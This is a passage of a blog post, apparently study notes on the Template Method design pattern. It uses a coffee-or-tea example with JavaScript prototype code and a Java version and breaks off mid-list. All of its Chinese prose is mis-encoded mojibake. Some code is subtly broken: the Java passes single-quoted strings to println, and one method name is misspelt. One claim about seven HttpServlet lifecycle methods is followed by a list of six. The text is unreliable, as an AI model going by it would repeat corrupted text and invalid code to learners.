    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”æ¨¡æ¿æ–¹æ³•æ¨¡å¼åœ¨ JavaScript å¼€å‘ä¸­ç”¨åˆ°ç»§æ‰¿çš„åœºæ™¯å…¶å®žä¸æ˜¯å¾ˆå¤šï¼Œå¾ˆå¤šæ—¶å€™æˆ‘ä»¬éƒ½å–œæ¬¢ç”¨ mix-in çš„æ–¹å¼ç»™å¯¹è±¡æ‰©å±•å±žæ€§ã€‚ä½†è¿™éƒ¨ä»£è¡¨ç»§æ‰¿åœ¨ JavaScript ä¸­æ²¡æœ‰ç”¨æ­¦ä¹‹åœ°ï¼Œè™½ç„¶æ²¡æœ‰çœŸæ­£çš„ç±»å’Œç»§æ‰¿æœºåˆ¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡åŽŸåž‹ prototype æ¥å˜ç›¸åœ°ç»§æ‰¿ã€‚ æœ¬ç« è®¨è®ºä¸€ç§åŸºäºŽç»§æ‰¿çš„è®¾è®¡æ¨¡å¼â€”â€”æ¨¡æ¿æ–¹æ³•ï¼ˆTemplate Methodï¼‰æ¨¡å¼ å®šä¹‰å’Œç»„æˆæ¨¡æ¿æ–¹æ³•æ¨¡å¼åªæ˜¯ä¸€ç§éœ€è¦ä½¿ç”¨ç»§æ‰¿å°±å¯ä»¥å®žçŽ°çš„éžå¸¸ç®€å•çš„æ¨¡å¼ã€‚ æ¨¡æ¿æ–¹æ³•æ¨¡å¼ç”±ä¸¤ä¸ªéƒ¨åˆ†ç»“æž„ç»„æˆï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯æŠ½è±¡çˆ¶ç±»ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯å…·ä½“çš„å®žçŽ°å­ç±»ã€‚é€šå¸¸åœ¨æŠ½è±¡çˆ¶ç±»ä¸­å°è£…äº†å­ç±»çš„ç®—æ³•æ¡†æž¶ï¼ŒåŒ…æ‹¬å®žçŽ°ä¸€äº›å…¬å…±çš„æ–¹æ³•ä»¥åŠå°è£…å­ç±»ä¸­æ‰€æœ‰æ–¹æ³•çš„æ‰§è¡Œé¡ºåºã€‚å­ç±»é€šè¿‡ç»§æ‰¿è¿™ä¸ªæŠ½è±¡ç±»ï¼Œä¹Ÿç»§æ‰¿äº†æ•´ä¸ªç®—æ³•ç»“æž„ï¼Œå¹¶ä¸”å¯ä»¥é€‰æ‹©é‡å†™çˆ¶ç±»çš„æ–¹æ³•ã€‚ å‡å¦‚æˆ‘ä»¬æœ‰ä¸€äº›å¹³è¡Œçš„å­ç±»ï¼Œå„ä¸ªå­ç±»ä¹‹é—´æœ‰ä¸€äº›ç›¸åŒçš„è¡Œä¸ºï¼Œä¹Ÿæœ‰ä¸€äº›ä¸åŒçš„è¡Œä¸ºã€‚å¦‚æžœç›¸åŒå’Œä¸åŒçš„è¡Œä¸ºéƒ½æ··åˆåœ¨å„ä¸ªå­ç±»çš„å®žçŽ°ä¸­ï¼Œè¯´æ˜Žè¿™äº›ç›¸åŒçš„è¡Œä¸ºä¼šåœ¨å„ä¸ªå­ç±»ä¸­é‡å¤å‡ºçŽ°ã€‚ä½†å®žé™…ä¸Šï¼Œç›¸åŒçš„è¡Œä¸ºå¯ä»¥è¢«æ¬ç§»åˆ°å¦å¤–ä¸€ä¸ªå•ä¸€çš„åœ°æ–¹ï¼Œæ¨¡æ¿æ–¹æ³•æ¨¡å¼å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è€Œç”Ÿçš„ã€‚åœ¨æ¨¡æ¿æ–¹æ³•æ¨¡å¼ä¸­ï¼Œå­ç±»å®žçŽ°çš„ç›¸åŒéƒ¨åˆ†è¢«ä¸Šç§»åˆ°äº†çˆ¶ç±»ä¸­ï¼Œè€Œå°†ä¸åŒçš„éƒ¨åˆ†ç•™å¾…å­ç±»ç±»å®žçŽ°ã€‚ä¹Ÿå¾ˆå¥½åœ°ä½“çŽ°äº†æ³›åŒ–çš„æ€æƒ³ã€‚ Coffee or Teaå’–å•¡å’ŒèŒ¶æ˜¯ä¸€ä¸ªç»å…¸çš„ä¾‹å­ã€‚ å…ˆæ³¡ä¸€æ¯å’–å•¡é¦–å…ˆï¼Œæˆ‘ä»¬æ¥æ³¡ä¸€æ¯å’–å•¡ï¼Œå¦‚æžœæ²¡æœ‰ä»€ä¹ˆå¤ªå¤šä¸ªæ€§åŒ–çš„éœ€æ±‚ï¼Œä¸€èˆ¬çš„æ­¥éª¤å¦‚ä¸‹ï¼š æŠŠæ°´ç…®æ²¸ ç”¨æ²¸æ°´å†²æ³¡å’–å•¡ æŠŠå’–å•¡å€’è¿›æ¯å­ åŠ ç³–å’Œç‰›å¥¶ ä»£ç ï¼š 123456789101112131415161718192021var Coffee = function()&#123;&#125;Coffee.prototype.boilWater = function()&#123; console.log('æŠŠæ°´ç…®æ²¸');&#125; Coffee.prototype.brewCoffeeGriends = function()&#123; console.log('ç”¨æ²¸æ°´å†²æ³¡å’–å•¡');&#125; Coffee.prototype.pourInCup = function()&#123; console.log('æŠŠå’–å•¡å€’è¿›æ¯å­');&#125; Coffee.prototype.addSugarAndMilk = function()&#123; console.log('åŠ ç³–å’Œç‰›å¥¶');&#125;Coffee.prototype.init = function()&#123; this.boilWater() this.brewCoffeeGriends() this.pourInCup() this.addSugarAndMilk()&#125;var coffee = new Coffee();coffee.init(); æ³¡ä¸€å£¶èŒ¶å¼€å§‹å‡†å¤‡æˆ‘ä»¬çš„èŒ¶ï¼Œæ­¥éª¤å·®ä¸å¤šï¼š æŠŠæ°´ç…®æ²¸ ç”¨æ²¸æ°´æµ¸æ³¡èŒ¶å¶ æŠŠèŒ¶æ°´å€’è¿›æ¯å­ åŠ æŸ æª¬ ä»£ç å®žçŽ°ï¼š 123456789101112131415161718192021var Tea = function()&#123;&#125;Tea.prototype.boilWater = function()&#123; console.log('æŠŠæ°´ç…®æ²¸');&#125; Tea.prototype.steepTeaBag = function()&#123; console.log('ç”¨æ²¸æ°´æµ¸æ³¡èŒ¶å¶');&#125; Tea.prototype.pourInCup = function()&#123; console.log('æŠŠèŒ¶æ°´å€’è¿›æ¯å­');&#125; Tea.prototype.addLemon = function()&#123; console.log('åŠ æŸ æª¬');&#125;Tea.prototype.init = function()&#123; this.boilWater() this.steepTeaBag() this.pourInCup() this.addLemon()&#125; var tea = new Tea();tea.init(); åˆ†ç¦»å‡ºå…±åŒç‚¹æˆ‘ä»¬å¯ä»¥å‘çŽ°å…¶å®žä¸¤ä¸ªæ­¥éª¤æ˜¯å¤§åŒå°å¼‚çš„ã€‚ ä¸»è¦ä½“çŽ°ä¸ºï¼š åŽŸæ–™ä¸åŒã€‚ä¸€ä¸ªæ˜¯å’–å•¡ï¼Œä¸€ä¸ªæ˜¯èŒ¶ï¼Œä½†æˆ‘ä»¬éƒ½å¯ä»¥ç»Ÿç§°ä¹‹ä¸ºé¥®æ–™ æ³¡çš„æ–¹å¼ä¸åŒã€‚å’–å•¡æ˜¯å†²æ³¡ï¼Œè€ŒèŒ¶å¶æ˜¯æµ¸æ³¡ï¼Œä½†æ˜¯éƒ½å¯ä»¥æŠ½è±¡ä¸ºâ€œæ³¡â€ åŠ å…¥çš„è°ƒæ–™ä¸åŒã€‚ä¸€ä¸ªæ˜¯ç³–å’Œç‰›å¥¶ï¼Œä¸€ä¸ªæ˜¯æŸ æª¬ï¼Œä½†æ˜¯éƒ½å¯ä»¥æŠ½è±¡ä¸º â€œè°ƒæ–™â€ ä¸ç®¡æ˜¯èŒ¶è¿˜æ˜¯å’–å•¡éƒ½å¯ä»¥æ•´ç†ä¸ºä¸‹é¢å››æ­¥ï¼š æŠŠæ°´ç…®æ²¸ ç”¨æ²¸æ°´æµ¸æ³¡é¥®æ–™ æŠŠé¥®æ–™å€’è¿›æ¯å­ åŠ è°ƒæ–™(condiments) çŽ°åœ¨å¯ä»¥åˆ›å»ºä¸€ä¸ªæŠ½è±¡çˆ¶ç±»æ¥è¡¨ç¤ºæ³¡(brew)ä¸€æ¯é¥®æ–™(Beverage)çš„æ•´ä¸ªè¿‡ç¨‹ï¼š 1234567891011121314var Beverage = function()&#123;&#125;Beverage.prototype.boilWater = function()&#123; console.log('æŠŠæ°´ç…®æ²¸');&#125; // ç©ºæ–¹æ³•ï¼Œåº”è¯¥ç”±å­ç±»é‡å†™Beverage.prototype.brew = function()&#123;&#125; Beverage.prototype.pourInCup = function()&#123;&#125; Beverage.prototype.addCondiments = function()&#123;&#125;Beverage.prototype.init = function()&#123; this.boilWater() this.brew() this.pourInCup() this.addCondiments()&#125; åˆ›å»º Coffee å­ç±»å’Œ Tea å­ç±»ç»§æ‰¿é¥®æ–™ç±»ï¼š 1234567891011121314var Coffee = function()&#123;&#125;Coffee.prototype = new Beverage();// é‡å†™æŠ½è±¡çˆ¶ç±»ä¸­çš„ä¸€äº›æ–¹æ³•ï¼ŒæŠŠåªæœ‰æŠŠæ°´ç…®æ²¸è¿™ä¸ªè¡Œä¸ºå¯ä»¥ä½¿ç”¨çˆ¶ç±»ä¸­çš„ boilWater æ–¹æ³•ï¼Œå…¶ä»–éƒ½éœ€è¦åœ¨ Coffee å­ç±»ä¸­é‡å†™Coffee.prototype.brew = function()&#123; console.log('ç”¨æ²¸æ°´å†²æ³¡å’–å•¡');&#125; Coffee.prototype.pourInCup = function()&#123; console.log('æŠŠå’–å•¡å€’è¿›æ¯å­');&#125; Coffee.prototype.addCondiments = function()&#123; console.log('åŠ ç³–å’Œç‰›å¥¶');&#125;var coffee = new Coffee();coffee.init(); å½“è°ƒç”¨ coffee å¯¹è±¡çš„ init æ–¹æ³•æ—¶å€™ï¼Œç”±äºŽ coffee å¯¹è±¡å’Œ Coffee æž„é€ å™¨çš„åŽŸåž‹ prototype ä¸Šæ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥è¯¥è¯·æ±‚ä¼šé¡ºç€åŽŸåž‹é“¾ï¼Œè¢«å§”æ‰˜ç»™ Coffee çš„çˆ¶ç±» Beverage åŽŸåž‹ä¸Šçš„ init æ–¹æ³•ã€‚è€Œè¿™ä¸ªæ–¹æ³•å·²ç»è§„å®šå¥½äº†æ³¡é¥®æ–™çš„é¡ºåºï¼Œæ‰€ä»¥æˆ‘ä»¬æˆåŠŸåœ°æ³¡å‡ºäº†ä¸€æ¯å’–å•¡ã€‚ Tea ç±»ï¼š 12345678910111213var Tea = function()&#123;&#125;Tea.prototype = new Beverage();Tea.prototype.brew = function()&#123; console.log('ç”¨æ²¸æ°´æµ¸æ³¡èŒ¶å¶');&#125; Tea.prototype.pourInCup = function()&#123; console.log('æŠŠèŒ¶æ°´å€’è¿›æ¯å­');&#125; Tea.prototype.addCondiments = function()&#123; console.log('åŠ æŸ æª¬');&#125;var tea = new Tea();tea.init(); Beverage.prototype.init å°±æ˜¯æ¨¡æ¿æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸­å°è£…äº†å­ç±»çš„ç®—æ³•æ¡†æž¶ï¼Œä»–ä½œä¸ºä¸€ä¸ªç®—æ³•çš„æ¨¡æ¿ï¼ŒæŒ‡å¯¼å­ç±»ä»¥ä½•ç§é¡ºåºåŽ»æ‰§è¡Œå“ªäº›æ–¹æ³•ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œç®—æ³•å†…çš„æ¯ä¸€æ­¥éª¤éƒ½æ¸…æ¥šåœ°å±•ç¤ºåœ¨æˆ‘ä»¬é¢å‰ã€‚ æŠ½è±¡ç±»åœ¨ Java ä¸­ï¼Œç±»åˆ†æˆä¸¤ç§ï¼Œä¸€ç§æ˜¯å…·ä½“ç±»ï¼Œå¦ä¸€ç§å°±æ˜¯æŠ½è±¡ç±»ã€‚å…·ä½“ç±»å¯ä»¥è¢«å®žä¾‹åŒ–ï¼ŒæŠ½è±¡ç±»ä¸èƒ½è¢«å®žä¾‹åŒ–ã€‚ ç”±äºŽæŠ½è±¡ç±»ä¸èƒ½è¢«å®žä¾‹åŒ–ï¼Œå¦‚æžœæœ‰äººç¼–å†™äº†ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œé‚£ä¹ˆè¿™ä¸ªæŠ½è±¡ç±»ä¸€å®šæ˜¯ç”¨æ¥è¢«æŸäº›å…·ä½“ç±»ç»§æ‰¿çš„ã€‚ æŠ½è±¡ç±»å’ŒæŽ¥å£ä¸€æ ·å¯ä»¥ç”¨äºŽå‘ä¸Šè½¬åž‹ï¼Œåœ¨é™æ€ç±»åž‹è¯­è¨€ä¸­ï¼Œç¼–è¯‘å™¨å¯¹ç±»åž‹æ£€æŸ¥æ€»æ˜¯ä¸€ä¸ªç»•ä¸å¼€çš„è¯é¢˜ä¸Žå›°æ‰°ã€‚è™½ç„¶ç±»åž‹æ£€æŸ¥å¯ä»¥æä¾›ç¨‹åºçš„å®‰å…¨æ€§ï¼Œä½†ç¹çè€Œä¸¥æ ¼çš„ç±»åž‹æ£€æŸ¥ä¹Ÿæ—¶å¸¸ä¼šè®©ç¨‹åºå‘˜è§‰å¾—éº»çƒ¦ã€‚æŠŠå¯¹è±¡çš„çœŸæ­£ç±»åž‹éšè—åœ¨æŠ½è±¡ç±»æˆ–è€…æŽ¥å£ä¹‹åŽï¼Œè¿™äº›å¯¹è±¡æ‰å¯ä»¥è¢«äº’ç›¸æ›¿æ¢ä½¿ç”¨ã€‚è¿™å¯ä»¥è®©æˆ‘ä»¬ Java ç¨‹åºå°½é‡é¿å…ä¾èµ–å€’ç½®åŽŸåˆ™ã€‚ é™¤äº†ç”¨äºŽå‘ä¸Šè½¬åž‹ï¼ŒæŠ½è±¡ç±»ä¹Ÿå¯ä»¥è¡¨ç¤ºä¸€ç§å¥‘çº¦ã€‚ç»§æ‰¿äº†è¿™ä¸ªæŠ½è±¡ç±»çš„æ‰€æœ‰å­ç±»éƒ½å°†æ‹¥æœ‰è·ŸæŠ½è±¡ç±»ä¸€è‡´çš„æŽ¥å£æ–¹æ³•ï¼ŒæŠ½è±¡ç±»çš„ä¸»è¦ä½œç”¨å°±æ˜¯ä¸ºå®ƒçš„å­ç±»å®šä¹‰è¿™äº›å…¬å…±æŽ¥å£ã€‚å¦‚æžœæˆ‘ä»¬åœ¨å­ç±»ä¸­åˆ é™¤äº†è¿™äº›æ–¹æ³•ä¸­çš„æŸä¸€ä¸ªï¼Œé‚£ä¹ˆå°†ä¸èƒ½é€šè¿‡ç¼–è¯‘å™¨çš„æ£€æŸ¥ï¼Œè¿™åœ¨æŸäº›åœºæ™¯ä¸‹æ˜¯éžå¸¸æœ‰ç”¨çš„ã€‚ä¾‹å¦‚ï¼ŒCoffee å­ç±»ä¸­æ²¡æœ‰å®žçŽ°å¯¹åº”çš„ brew æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç™¾åˆ†ä¹‹ç™¾å¾—ä¸åˆ°ä¸€æ¯å’–å•¡ã€‚æ—¢ç„¶çˆ¶ç±»è§„å®šäº†å­ç±»çš„æ–¹æ³•å’Œæ‰§è¡Œè¿™äº›æ–¹æ³•çš„é¡ºåºï¼Œå­ç±»å°±åº”è¯¥æ‹¥æœ‰è¿™äº›æ–¹æ³•ï¼Œå¹¶ä¸”æä¾›æ­£ç¡®çš„å®žçŽ°ã€‚ æŠ½è±¡æ–¹æ³•å’Œå…·ä½“æ–¹æ³•æŠ½è±¡æ–¹æ³•è¢«å£°æ˜Žåœ¨æŠ½è±¡ç±»ä¸­ï¼ŒæŠ½è±¡æ–¹æ³•å¹¶æ²¡æœ‰å…·ä½“çš„å®žçŽ°è¿‡ç¨‹ï¼Œéƒ½æ˜¯ä¸€äº› â€œå“‘â€ æ–¹æ³•ã€‚æ¯”å¦‚ Beverage ç±»ä¸­çš„ brew æ–¹æ³•ã€pourInCup æ–¹æ³•å’Œ addCondiments æ–¹æ³•ï¼Œéƒ½è¢«å£°æ˜Žä¸ºæŠ½è±¡æ–¹æ³•ã€‚å½“å­ç±»ç»§æ‰¿äº†è¿™ä¸ªæŠ½è±¡ç±»æ—¶ï¼Œå¿…é¡»é‡å†™çˆ¶ç±»çš„æŠ½è±¡æ–¹æ³•ã€‚ é™¤äº†æŠ½è±¡æ–¹æ³•ä¹‹å¤–ï¼Œå¦‚æžœæ¯ä¸ªå­ç±»ä¸­éƒ½æœ‰ä¸€äº›åŒæ ·çš„å…·ä½“å®žçŽ°æ–¹æ³•ï¼Œé‚£è¿™äº›æ–¹æ³•ä¹Ÿå¯ä»¥é€‰æ‹©æ”¾åœ¨æŠ½è±¡ç±»ä¸­ï¼Œè¿™å¯ä»¥èŠ‚çœä»£ç ä»¥è¾¾åˆ°å¤ç”¨çš„æ•ˆæžœï¼Œè¿™äº›æ–¹æ³•å«åšå…·ä½“æ–¹æ³•ã€‚å½“ä»£ç éœ€è¦æ”¹å˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦æ”¹åŠ¨æŠ½è±¡ç±»é‡Œçš„å…·ä½“æ–¹æ³•å°±å¯ä»¥äº†ã€‚ ç”¨ Java å®žçŽ° Coffee or Tea123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public abstract class Beverage&#123; // æŠ½è±¡ç±»é¥®æ–™ final void init()&#123; // æ¨¡æ¿æ–¹æ³• boilWater(); brew(); pourInCup(); addCondiments(); &#125; // å…·ä½“æ–¹æ³• void boilWater()&#123; System.out.println('æŠŠæ°´ç…®æ²¸'); &#125; // æŠ½è±¡ç±»æ–¹æ³• abstract void brew(); abstract void pourInCup(); abstract void addCondiments();&#125;public class Coffee extends Beverage&#123; // Coffee ç±» @Override void brew()&#123; // å­ç±»ä¸­é‡å†™ brew æ–¹æ³• System.out.println('ç”¨æ²¸æ°´å†²æ³¡å’–å•¡'); &#125; @Override void pourInCup()&#123; // å­ç±»ä¸­é‡å†™ pourInCup æ–¹æ³• System.out.println('æŠŠå’–å•¡å€’è¿›æ¯å­'); &#125; @Override void addCondiments()&#123; // å­ç±»ä¸­é‡å†™ addCondiments æ–¹æ³• System.out.println('åŠ ç³–å’Œç‰›å¥¶'); &#125; &#125;public class Tea extends Beverage&#123; // Coffee ç±» @Override void brew()&#123; // å­ç±»ä¸­é‡å†™ brew æ–¹æ³• System.out.println('ç”¨æ²¸æ°´æµ¸æ³¡èŒ¶å¶'); &#125; @Override void pourInCup()&#123; // å­ç±»ä¸­é‡å†™ pourInCup æ–¹æ³• System.out.println('æŠŠèŒ¶å€’è¿›æ¯å­'); &#125; @Override void addCondiments()&#123; // å­ç±»ä¸­é‡å†™ addCondiments æ–¹æ³• System.out.println('åŠ æŸ æª¬'); &#125; &#125;public class Test&#123; public static void prepareRecipe(Beverage beverage)&#123; beverage.init(); &#125; public static void main(String args[])&#123; Beverage coffee = new Coffee(); // åˆ›å»º coffee å¯¹è±¡ prepareRecipe(coffee); // å¼€å§‹æ³¡å’–å•¡ // æŠŠæ°´ç…®æ²¸ // ç”¨æ²¸æ°´å†²æ³¡å’–å•¡ // æŠŠå’–å•¡å€’è¿›æ¯å­ // åŠ ç³–å’Œç‰›å¥¶ Beverage tea = new Tea(); // åˆ›å»º tea å¯¹è±¡ prepareRecipe(tea); // å¼€å§‹æ³¡èŒ¶ // æŠŠæ°´ç…®æ²¸ // ç”¨æ²¸æ°´æµ¸æ³¡èŒ¶å¶ // æŠŠèŒ¶å€’è¿›æ¯å­ // åŠ æŸ æª¬ &#125;&#125; JavaScript æ²¡æœ‰æŠ½è±¡ç±»çš„ç¼ºç‚¹å’Œè§£å†³æ–¹æ¡ˆJavaScript å¹¶æ²¡æœ‰ä»Žè¯­æ³•å±‚é¢æä¾›å¯¹æŠ½è±¡ç±»çš„æ”¯æŒã€‚æŠ½è±¡ç±»çš„ç¬¬ä¸€ä¸ªä½œç”¨æ˜¯éšè—å¯¹è±¡çš„å…·ä½“ç±»åž‹ï¼Œç”±äºŽ JavaScript æ˜¯ä¸€é—¨ â€œç±»åž‹æ¨¡ç³Šâ€ çš„è¯­è¨€ï¼Œæ‰€ä»¥éšè—å¯¹è±¡çš„ç±»åž‹åœ¨ JavaScript ä¸­å¹¶ä¸é‡è¦ã€‚ å¦ä¸€æ–¹é¢ï¼Œå½“æˆ‘ä»¬åœ¨ JavaScript ä¸­ä½¿ç”¨åŽŸåž‹ç»§æ‰¿æ¨¡æ‹Ÿä¼ ç»Ÿçš„ç±»å¼ç»§æ‰¿æ—¶ï¼Œå¹¶æ²¡æœ‰ç¼–è¯‘å™¨å¸®åŠ©æˆ‘ä»¬è¿›è¡Œä»»ä½•å½¢å¼çš„æ£€æŸ¥ï¼Œæˆ‘ä»¬ä¹Ÿæ²¡æœ‰åŠžæ³•ä¿è¯å­ç±»ä¼šé‡å†™çˆ¶ç±»ä¸­çš„ â€œæŠ½è±¡æ–¹æ³•â€ã€‚ æˆ‘ä»¬çŸ¥é“ï¼ŒBeverage.prototype.init ä½œä¸ºæ¨¡ä»¿æ–¹æ³•ï¼Œå·²ç»è§„å®šäº†å­ç±»çš„ç®—æ³•æ¡†æž¶ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456Beverage.prototype.init = function()&#123; this.boilWater(); this.brew(); this.pourInCup(); this.addCondiments(); &#125;; å¦‚æžœæˆ‘ä»¬çš„ Coffee ç±»æˆ–è€… Tea ç±»å¿˜è®°å®žçŽ°è¿™ 4 ä¸ªæ–¹æ³•ä¸­çš„ä¸€ä¸ªå‘¢ï¼Ÿæ‹¿ brew æ–¹æ³•ä¸¾ä¾‹ï¼Œå¦‚æžœæˆ‘ä»¬å¿˜è®°ç¼–å†™ Coffee.prototype.brew æ–¹æ³•ï¼Œé‚£ä¹ˆå½“è¯·æ±‚ coffee å¯¹è±¡çš„ brew æ—¶ï¼Œè¯·æ±‚ä¼šé¡ºç€åŽŸåž‹é“¾æ‰¾åˆ° Beverageâ€œçˆ¶ç±»â€å¯¹åº”çš„ Beverage.prototype.brew æ–¹æ³•ï¼Œè€Œ Beverage.prototype.brew æ–¹åˆ°ç›®å‰ä¸ºæ­¢æ˜¯ä¸€ä¸ªç©ºæ–¹æ³•ï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸èƒ½ç¬¦åˆæˆ‘ä»¬éœ€è¦çš„ã€‚ åœ¨ Java ä¸­ç¼–è¯‘å™¨ä¼šä¿è¯å­ç±»ä¼šé‡å†™çˆ¶ç±»ä¸­çš„æŠ½è±¡æ–¹æ³•ï¼Œä½†åœ¨ JavaScript ä¸­å´æ²¡æœ‰è¿›è¡Œè¿™äº›æ£€æŸ¥å·¥ä½œã€‚æˆ‘ä»¬åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™å¾—ä¸åˆ°ä»»ä½•å½¢å¼çš„è­¦å‘Šï¼Œå®Œå…¨å¯„æ‰˜äºŽç¨‹åºå‘˜çš„è®°å¿†åŠ›å’Œè‡ªè§‰æ€§æ˜¯å¾ˆå±é™©çš„ï¼Œç‰¹åˆ«æ˜¯å½“æˆ‘ä»¬ä½¿ç”¨æ¨¡æ¿æ–¹æ³•æ¨¡å¼è¿™ç§å®Œå…¨ä¾èµ–ç»§æ‰¿è€Œå®žçŽ°çš„è®¾è®¡æ¨¡å¼æ—¶ã€‚ ä¸‹é¢æä¾›ä¸¤ç§å˜é€šçš„è§£å†³æ–¹æ¡ˆã€‚ ç¬¬ 1 ç§æ–¹æ¡ˆæ˜¯ç”¨é¸­å­ç±»åž‹æ¥æ¨¡æ‹ŸæŽ¥å£æ£€æŸ¥ï¼Œä»¥ä¾¿ç¡®ä¿å­ç±»ä¸­ç¡®å®žé‡å†™äº†çˆ¶ç±»çš„æ–¹æ³•ã€‚ä½†æ¨¡æ‹ŸæŽ¥å£æ£€æŸ¥ä¼šå¸¦æ¥ä¸å¿…è¦çš„å¤æ‚æ€§ï¼Œè€Œä¸”è¦æ±‚ç¨‹åºå‘˜ä¸»åŠ¨è¿›è¡Œè¿™äº›æŽ¥å£æ£€æŸ¥ï¼Œè¿™å°±è¦æ±‚æˆ‘ä»¬åœ¨ä¸šåŠ¡ä»£ç ä¸­æ·»åŠ ä¸€äº›è·Ÿä¸šåŠ¡é€»è¾‘æ— å…³çš„ä»£ç ã€‚ ç¬¬ 2 ç§æ–¹æ¡ˆæ˜¯è®© Beverage.prototype.brew ç­‰æ–¹æ³•ç›´æŽ¥æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œå¦‚æžœå› ä¸ºç²—å¿ƒå¿˜è®°ç¼–å†™ Coffee.prototype.brew æ–¹æ³•ï¼Œé‚£ä¹ˆè‡³å°‘æˆ‘ä»¬ä¼šåœ¨ç¨‹åºè¿è¡Œæ—¶å¾—åˆ°ä¸€ä¸ªé”™è¯¯ã€‚ 123456789Beverage.prototype.brew = function()&#123; throw new Error( 'å­ç±»å¿…é¡»é‡å†™ brew æ–¹æ³•' ); &#125;; Beverage.prototype.pourInCup = function()&#123; throw new Error( 'å­ç±»å¿…é¡»é‡å†™ pourInCup æ–¹æ³•' ); &#125;; Beverage.prototype.addCondiments = function()&#123; throw new Error( 'å­ç±»å¿…é¡»é‡å†™ addCondiments æ–¹æ³•' ); &#125;; ç¬¬ 2 ç§è§£å†³æ–¹æ¡ˆçš„ä¼˜ç‚¹æ˜¯å®žçŽ°ç®€å•ï¼Œä»˜å‡ºçš„é¢å¤–ä»£ä»·å¾ˆå°‘ï¼›ç¼ºç‚¹æ˜¯æˆ‘ä»¬å¾—åˆ°é”™è¯¯ä¿¡æ¯çš„æ—¶é—´ç‚¹å¤ªé åŽ æˆ‘ä»¬ä¸€å…±æœ‰ 3 æ¬¡æœºä¼šå¾—åˆ°è¿™ä¸ªé”™è¯¯ä¿¡æ¯ï¼Œç¬¬ 1 æ¬¡æ˜¯åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™ï¼Œé€šè¿‡ç¼–è¯‘å™¨çš„æ£€æŸ¥æ¥å¾—åˆ°é”™è¯¯ä¿¡æ¯ï¼›ç¬¬ 2 æ¬¡æ˜¯åœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™ç”¨é¸­å­ç±»åž‹æ¥è¿›è¡Œâ€œæŽ¥å£æ£€æŸ¥â€ï¼›è€Œç›®å‰æˆ‘ä»¬ä¸å¾—ä¸åˆ©ç”¨æœ€åŽä¸€æ¬¡æœºä¼šï¼Œåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­æ‰çŸ¥é“å“ªé‡Œå‘ç”Ÿäº†é”™è¯¯ã€‚ ä½¿ç”¨åœºæ™¯ä»Žå¤§çš„æ–¹é¢æ¥è®²ï¼Œæ¨¡æ¿æ–¹æ³•æ¨¡å¼å¸¸è¢«æž¶æž„å¸ˆç”¨äºŽæž„å»ºé¡¹ç›®çš„æ¡†æž¶ï¼Œæž¶æž„å¸ˆè®¢å¥½äº†æ¡†æž¶çš„éª¨æž¶ï¼Œç¨‹åºå‘˜ç»§æ‰¿æž¶æž„çš„ç»“æž„åŽï¼Œè´Ÿè´£å¾€é‡Œé¢å¡«ç©ºï¼Œæ¯”å¦‚ Java ç¨‹åºå‘˜å¤§å¤šä½¿ç”¨è¿‡çš„ HttpServlet æŠ€æœ¯æ¥å¼€å‘é¡¹ç›®ã€‚ ä¸€ä¸ªåŸºäºŽ HttpServlet çš„ç¨‹åºåŒ…å« 7 ä¸ª ç”Ÿå‘½å‘¨æœŸï¼Œè¿™ 7 ä¸ªå‘¨æœŸåˆ†åˆ«å¯¹åº”ä¸€ä¸ª do æ–¹æ³•ã€‚ doGet() doHead() doPut() doDelete() doOption() doTrace() HttpServlet ç±»è¿˜æä¾›äº†ä¸€ä¸ª service æ–¹æ³•ï¼Œå®ƒå°±æ˜¯è¿™é‡Œçš„æ¨¡æ¿æ–¹æ³•ï¼Œservice è§„å®šäº†è¿™äº› do æ–¹æ³•çš„æ‰§è¡Œé¡ºåºï¼Œè€Œè¿™äº› do æ–¹æ³•çš„å…·ä½“å®žçŽ°åˆ™éœ€è¦ HttpServlet çš„å­ç±»æ¥æä¾›ã€‚ åœ¨ Web å¼€å‘ä¸­ä¹Ÿèƒ½æ‰¾æ‰“å¾ˆå¤šæ¨¡æ¿æ–¹æ³•æ¨¡å¼é€‚ç”¨çš„åœºæ™¯ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨æž„å»ºä¸€ç³»åˆ—çš„ UI ç»„ä»¶ï¼Œè¿™äº›ç»„ä»¶çš„æž„å»ºè¿‡ç¨‹ä¸€èˆ¬å¦‚ä¸‹æ‰€ç¤ºï¼š åˆå§‹åŒ–ä¸€ä¸ª div å®¹å™¨ é€šè¿‡ ajax è¯·æ±‚æ‹‰å–ç›¸åº”çš„æ•°æ® 